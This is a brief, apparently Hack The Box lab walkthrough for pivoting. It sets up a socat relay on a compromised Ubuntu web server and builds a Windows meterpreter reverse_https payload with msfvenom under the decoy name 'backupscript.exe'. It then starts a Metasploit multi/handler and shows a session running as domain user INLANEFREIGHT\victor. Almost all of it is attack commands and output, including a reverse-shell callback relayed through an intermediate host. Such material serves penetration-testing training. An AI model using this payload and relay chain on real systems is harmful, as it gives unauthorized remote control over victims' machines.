#### Starting Socat Listener

```shell
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
#### Creating the Windows Payload

```shell
3kjS@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
#### Starting MSF Console

```shell
3kjS@htb[/htb]$ sudo msfconsole 

<SNIP>
```
#### Configuring & Starting the multi/handler

```shell
msf6 > use exploit/multi/handler
```
#### Establishing the Meterpreter Session

```shell
meterpreter > getuid 
Server username: INLANEFREIGHT\victor
```
